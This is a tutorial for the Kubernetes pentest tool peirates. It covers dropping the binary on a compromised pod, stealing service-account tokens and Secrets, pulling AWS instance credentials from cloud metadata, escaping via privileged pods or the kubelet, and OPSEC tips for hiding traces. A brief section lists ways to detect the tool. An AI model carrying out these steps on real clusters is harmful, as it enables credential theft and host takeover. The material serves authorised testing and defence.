# peirates — full tutorial

`peirates` (InGuardians) is the Kubernetes pentest framework. From inside a popped pod, it automates pod-token enumeration, RBAC-edge attacks, secret extraction, kubelet abuse, and pod escapes. The Pacu of Kubernetes.

## Install

Drop the static binary on the popped pod:

```terminal
# Operator side: build / download
go install github.com/inguardians/peirates@latest

# Or grab a release:
wget https://github.com/inguardians/peirates/releases/latest/download/peirates -O /tmp/peirates
chmod +x /tmp/peirates
```

Best delivered via webshell or `kubectl cp` if you already have access.

## Run

```terminal
./peirates
```

Interactive menu loads. Reads service-account token from `/var/run/secrets/kubernetes.io/serviceaccount/token` automatically.

## Menu groups

| # | Group |
|---|-------|
| 0–9 | Pod / token enumeration |
| 10–19 | RBAC actions, ConfigMap / Secret theft |
| 20–29 | Pod / Deployment manipulation |
| 30–39 | Kubelet attacks |
| 40–49 | Cloud metadata pivot |
| 50–59 | Persistence |
| 60+ | Misc |

The menu numbers shift across versions — `?` always shows current list.

## High-value actions

| Menu | Effect |
|------|--------|
| `1 — get pod list` | Live pods in the cluster (you may not be allowed) |
| `2 — get nodes` | Nodes |
| `4 — token from a pod's SA` | Steal token from another pod (same namespace, if RBAC permits) |
| `7 — list secrets` | Dump K8s Secrets |
| `9 — get cloud metadata` | Reach IMDS — typically AWS instance creds |
| `13 — RBAC attack — escalate` | Tries documented privilege paths |
| `20 — exec on a pod` | `kubectl exec`-style |
| `21 — create privileged pod` | hostPath / hostPID / privileged → escape |
| `30 — kubelet abuse` | Talk to kubelet 10250 directly |
| `45 — find AWS credentials in cluster` | Scrape env vars / mounted secrets |
| `99 — drop to shell` | Exit interactive menu |

## Workflows

### Standard from a popped pod

```terminal
./peirates
peirates> 1     # pod list — what can I see?
peirates> 7     # any Secrets readable?
peirates> 9     # cloud metadata token
peirates> 21    # privileged pod create — auto-mounts host /
```

### Deploy an evil privileged pod (menu 21)

Tool generates manifest with `hostPID/hostNetwork: true`, `privileged: true`, host root mounted to `/host`. After apply, `kubectl exec`-into and `chroot /host` → host root.

### Escape via kubelet (menu 30)

If kubelet on the node has `anonymous-auth=true` or accepts your SA token, peirates lets you list pods + run commands on them via the `/run/<ns>/<pod>/<container>?cmd=...` endpoint. Bypasses some RBAC.

### Pivot to cloud (menu 9)

```
peirates> 9
[+] Reaching IMDSv1...
[+] Got AWS creds:
    AccessKeyId: ASIA...
    SecretAccessKey: ...
    Token: ...
[+] Saved to env. Use 'aws ...' from this shell.
```

## Good output

```
peirates> 1
[+] Listing pods:
NAMESPACE  NAME           STATUS
default    web-0          Running
default    web-1          Running
kube-system  kube-proxy-x  Running
kube-system  metrics-server Running

peirates> 7
[+] Listing secrets:
default/my-app-db-creds
default/registry-pull-secret
[+] Reading default/my-app-db-creds:
DB_USER: appuser
DB_PASS: SuperSecret1!
```

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| `forbidden: ... cannot list pods` | RBAC denies — use `auth can-i --list` first to know what's allowed |
| `connection refused` to apiserver | DNS / network policy — try cluster IP directly |
| Privileged pod fails to create | PodSecurityAdmission / OPA blocking — try less-privileged escape (hostPath only) |
| Cloud metadata returns nothing | IMDSv2 enforced + hop-limit 1 → SSRF needs PUT |

## Defender's perspective

Easily detectable:

- Audit log: `pods/exec` / `pods/create` from a pod's service account.
- New pod with `hostPath: /` mount in audit log → critical.
- Burst of `secrets get` from a low-priv SA.

Detection ideas:
- Falco rule: `Terminal shell in container` + `Pod created with hostPath`.
- Audit-log alert: any service account creating a privileged pod.
- Network policy default-deny — peirates can't reach apiserver from pod.

## OPSEC

- Drop binary into `/tmp` only; remove after run.
- Privilege-escalation actions are loud. Use peirates for enumeration only; do escalation manually with explicit understanding of audit footprint.
- Service-account token in stolen-pod context is forensically traceable; consider creating a fresh pod to use as your foothold rather than pivoting via the original RCE.

## Related tools

| Tool | Niche |
|------|-------|
| **kubeletctl** | Kubelet-specific abuse |
| **botb** (Break Out The Box) | Container-escape PoCs |
| **deepce** | Container privesc enumeration |
| **kube-hunter** | Pre-auth K8s scanner |
| **Pacu** | AWS post-compromise (cluster-host pivot continues there) |
